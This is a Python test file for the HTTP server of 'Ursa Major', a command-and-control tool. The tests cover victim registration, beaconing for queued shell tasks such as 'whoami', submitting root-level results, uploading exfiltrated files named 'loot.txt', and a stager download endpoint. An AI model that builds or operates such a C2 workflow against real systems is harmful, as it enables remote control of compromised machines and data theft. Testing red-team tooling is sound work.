"""Tests for the Ursa Major C2 HTTP server."""

import json
import base64
import urllib.request
import urllib.error

import pytest
from major.db import create_task, get_task, get_session


def _post(host, port, path, data):
    """POST JSON to the test C2 server."""
    url = f"http://{host}:{port}{path}"
    body = json.dumps(data).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    try:
        resp = urllib.request.urlopen(req, timeout=5)
        return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        body = json.loads(e.read()) if e.fp else {}
        return e.code, body


def _get(host, port, path):
    """GET from the test C2 server."""
    url = f"http://{host}:{port}{path}"
    try:
        resp = urllib.request.urlopen(url, timeout=5)
        return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


class TestGetEndpoints:

    def test_root_returns_ok(self, c2_test_server):
        host, port = c2_test_server
        status, body = _get(host, port, "/")
        data = json.loads(body)
        assert status == 200
        assert data["status"] == "ok"

    def test_health_endpoint(self, c2_test_server):
        host, port = c2_test_server
        status, body = _get(host, port, "/health")
        data = json.loads(body)
        assert status == 200
        assert data["status"] == "healthy"

    def test_unknown_path_returns_404(self, c2_test_server):
        host, port = c2_test_server
        status, _ = _get(host, port, "/nonexistent")
        assert status == 404


class TestRegistration:

    def test_register_creates_session(self, c2_test_server):
        host, port = c2_test_server
        status, resp = _post(host, port, "/register", {
            "hostname": "VICTIM1",
            "username": "jdoe",
            "os": "Windows 10",
            "arch": "x64",
            "pid": 4444,
            "process": "explorer.exe",
        })
        assert status == 200
        assert "session_id" in resp
        assert "key" in resp
        assert len(resp["key"]) == 64

        session = get_session(resp["session_id"])
        assert session is not None
        assert session["hostname"] == "VICTIM1"
        assert session["username"] == "jdoe"

    def test_register_minimal_body(self, c2_test_server):
        host, port = c2_test_server
        status, resp = _post(host, port, "/register", {})
        assert status == 200
        assert "session_id" in resp


class TestBeacon:

    def _register(self, host, port):
        _, resp = _post(host, port, "/register", {"hostname": "BEACON_TEST"})
        return resp["session_id"]

    def test_beacon_returns_pending_tasks(self, c2_test_server):
        host, port = c2_test_server
        sid = self._register(host, port)
        tid = create_task(sid, "shell", {"command": "whoami"})

        status, resp = _post(host, port, "/beacon", {"session_id": sid})
        assert status == 200
        assert len(resp["tasks"]) == 1
        assert resp["tasks"][0]["type"] == "shell"
        assert resp["tasks"][0]["id"] == tid

    def test_beacon_empty_when_no_tasks(self, c2_test_server):
        host, port = c2_test_server
        sid = self._register(host, port)

        status, resp = _post(host, port, "/beacon", {"session_id": sid})
        assert status == 200
        assert resp["tasks"] == []

    def test_beacon_unknown_session_returns_404(self, c2_test_server):
        host, port = c2_test_server
        status, _ = _post(host, port, "/beacon", {"session_id": "INVALID1"})
        assert status == 404

    def test_beacon_missing_session_id_returns_400(self, c2_test_server):
        host, port = c2_test_server
        status, _ = _post(host, port, "/beacon", {})
        assert status == 400


class TestResult:

    def test_submit_result(self, c2_test_server):
        host, port = c2_test_server
        _, reg = _post(host, port, "/register", {"hostname": "R1"})
        sid = reg["session_id"]
        tid = create_task(sid, "shell", {"command": "id"})

        status, resp = _post(host, port, "/result", {
            "session_id": sid,
            "task_id": tid,
            "result": "uid=0(root)",
            "error": "",
        })
        assert status == 200
        t = get_task(tid)
        assert t["status"] == "completed"
        assert t["result"] == "uid=0(root)"

    def test_result_missing_fields_returns_400(self, c2_test_server):
        host, port = c2_test_server
        status, _ = _post(host, port, "/result", {})
        assert status == 400


class TestFileTransfer:

    def test_upload_and_download(self, c2_test_server):
        host, port = c2_test_server
        _, reg = _post(host, port, "/register", {"hostname": "FT1"})
        sid = reg["session_id"]

        file_data = b"exfiltrated secrets"
        status, resp = _post(host, port, "/upload", {
            "session_id": sid,
            "filename": "loot.txt",
            "data": base64.b64encode(file_data).decode(),
        })
        assert status == 200
        fid = resp["file_id"]

        status, body = _get(host, port, f"/download/{fid}")
        assert status == 200
        assert body == file_data

    def test_download_nonexistent_returns_404(self, c2_test_server):
        host, port = c2_test_server
        status, _ = _get(host, port, "/download/NOPE1234")
        assert status == 404


class TestStageEndpoint:

    def test_stage_serves_stager(self, c2_test_server):
        host, port = c2_test_server
        status, body = _get(host, port, "/stage")
        assert status == 200
        assert len(body) > 0
